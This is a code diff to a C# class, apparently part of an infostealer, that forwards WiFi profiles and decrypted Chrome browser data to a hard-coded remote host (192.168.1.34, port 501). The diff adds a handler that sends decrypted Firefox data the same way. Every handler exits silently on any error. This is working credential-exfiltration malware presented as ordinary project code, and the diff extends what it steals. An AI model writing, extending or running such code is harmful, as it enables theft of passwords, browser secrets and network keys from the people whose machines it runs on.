@@ -1,6 +1,7 @@
 using System;
 using System.Collections.Generic;
 using ChromeDecrypt;
+using FirefoxDecrypt.Models;
 using PS03.Transmit;
 using WiPS.Modles;
 
@@ -8,9 +9,11 @@ namespace PS03
 {
     public class Eventhandlers
     {
-        public RTransLink rtl = new RTransLink("192.168.1.34",501);
-        private ChromePacker cpack = new ChromePacker();
-        private WifiPacker wpack = new WifiPacker();
+        private readonly ChromePacker cpack = new ChromePacker();
+        private readonly WifiPacker wpack = new WifiPacker();
+        private readonly FirefoxPakcer fpack = new FirefoxPakcer();
+
+        public RTransLink rtl = new RTransLink("192.168.1.34", 501);
 
         public void HandleWiFiProfileReady(List<Profile> profiles)
         {
@@ -20,12 +23,11 @@ namespace PS03
                 {
                     rtl.Send(wpack.Pack(profile));
                 }
-                catch(Exception)
+                catch (Exception)
                 {
                     Environment.Exit(0);
                 }
             }
-                
         }
 
         public void HandleChromeDataReady(List<CPProfile> profiles)
@@ -41,7 +43,22 @@ namespace PS03
                     Environment.Exit(0);
                 }
             }
+        }
 
+
+        public void HandleFirefoxDataReady(List<FFData> profiles)
+        {
+            foreach(var profile in profiles)
+            {
+                try
+                {
+                    rtl.Send(fpack.Pack(profile));
+                }
+                catch (Exception)
+                {
+                    Environment.Exit(0);
+                }
+            }
         }
     }
 }
